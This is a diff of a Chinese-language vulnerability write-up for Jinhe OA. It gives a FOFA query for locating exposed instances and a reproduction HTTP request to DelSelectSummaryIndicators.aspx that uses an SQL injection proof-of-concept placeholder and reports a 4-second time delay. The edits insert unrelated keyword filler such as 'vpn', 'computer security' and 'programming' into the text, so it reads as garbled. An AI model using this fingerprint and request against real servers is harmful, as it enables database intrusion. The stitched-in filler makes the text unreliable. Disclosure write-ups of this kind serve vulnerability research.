@@ -17,6 +17,8 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="金和网络-金和OA"
+>
+> 计算机服务器
 
 # 漏洞分析
 
@@ -57,6 +59,14 @@ public bool DeleteCountFilterByFilterID(string FilterID)
 
 # 漏洞复现
 
+深入探索
+
+计算机安全
+
+vpn
+
+开发工具
+
 ```
 GET /c6/Jhsoft.Web.dossier/DelSelectSummaryIndicators.aspx/?ID=SQLI_POC HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -66,4 +76,4 @@ Host: jhsoft.mrxn.net
 
 成功延时 4 秒
 
-数据管理
+编程
